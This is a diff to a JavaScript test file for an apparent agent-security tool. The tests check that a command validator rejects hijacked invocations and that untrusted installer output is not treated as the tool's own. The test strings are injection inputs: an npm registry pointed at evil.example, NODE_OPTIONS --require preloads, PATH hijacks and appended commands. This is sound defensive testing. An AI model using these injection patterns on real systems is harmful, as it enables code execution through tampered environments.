@@ -39,6 +39,9 @@ describe('installed Codex native hooks', () => {
     assert.equal(isStandaloneAgentGuardCliCommand('npm_config_registry=https://evil.example npx @goplus/agentguard connect'), false);
     assert.equal(isStandaloneAgentGuardCliCommand('NODE_OPTIONS=--require=./other.js npx @goplus/agentguard connect'), false);
     assert.equal(isStandaloneAgentGuardCliCommand('/tmp/npx @goplus/agentguard connect'), false);
+    assert.equal(isStandaloneAgentGuardCliCommand('PATH=/tmp/other agentguard status'), false);
+    assert.equal(isStandaloneAgentGuardCliCommand('env NODE_OPTIONS=--require=./other.js agentguard status'), false);
+    assert.equal(isStandaloneAgentGuardCliCommand('AGENTGUARD_MODE=local agentguard status'), true);
     assert.equal(isStandaloneAgentGuardCliCommand('npx @goplus/agentguard@1.2.4-beta.1 scan'), true);
     assert.equal(isStandaloneAgentGuardCliCommand('npx @goplus/agentguard doctor'), true);
     assert.equal(isStandaloneAgentGuardCliCommand('npx -y @goplus/agentguard init --yes'), true);
@@ -48,6 +51,7 @@ describe('installed Codex native hooks', () => {
 
   it('attributes installer results by output signature without trusting a URL', () => {
     assert.equal(isAgentGuardOwnedOutputResult(installerCommand, { output: installerOutput }), true);
+    assert.equal(isAgentGuardOwnedOutputResult(installerCommand, { output: `${'other output '.repeat(200)}${installerOutput}` }), false);
     assert.equal(isAgentGuardOwnedOutputResult(installerCommand, { output: 'api_key=sk-unrelated-1234567890' }), false);
     assert.equal(isAgentGuardOwnedOutputResult(`${installerCommand}; echo extra`, { output: installerOutput }), false);
     assert.equal(isAgentGuardOwnedOutputResult(installerCommand.replace('https:', 'http:'), { output: installerOutput }), false);
